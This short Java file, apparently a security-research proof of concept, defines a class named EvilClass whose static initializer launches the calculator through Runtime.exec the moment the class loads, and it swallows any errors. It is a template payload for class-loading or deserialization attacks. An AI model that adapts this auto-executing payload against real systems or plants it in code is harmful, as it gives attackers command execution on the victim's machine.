package util;

/**
 * @Description
 * @Author dragonkeep
 * @Date 2025/1/14
 */
public class EvilClass {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        }catch (Exception e){}
    }
}
